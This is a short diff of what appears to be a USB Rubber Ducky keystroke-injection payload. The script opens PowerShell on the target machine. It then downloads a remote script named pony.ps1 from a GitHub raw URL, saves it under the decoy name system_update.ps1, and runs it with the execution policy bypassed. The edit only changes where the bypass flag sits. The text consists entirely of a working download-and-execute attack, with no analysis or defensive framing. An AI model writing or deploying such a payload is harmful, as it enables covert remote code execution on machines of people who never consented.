@@ -4,5 +4,5 @@ DELAY 1000
 STRING powershell
 ENTER
 DELAY 3000
-STRING powershell -c "start-bitstransfer -source https://raw.githubusercontent.com/PolymorphicOpcode/pony/main/pony.ps1 -destination .\system_update.ps1;powershell -ExecutionPolicy Bypass -File .\system_update.ps1"
+STRING powershell -ExecutionPolicy Bypass -c "start-bitstransfer -source https://raw.githubusercontent.com/PolymorphicOpcode/pony/main/pony.ps1 -destination .\system_update.ps1; .\system_update.ps1"
 ENTER
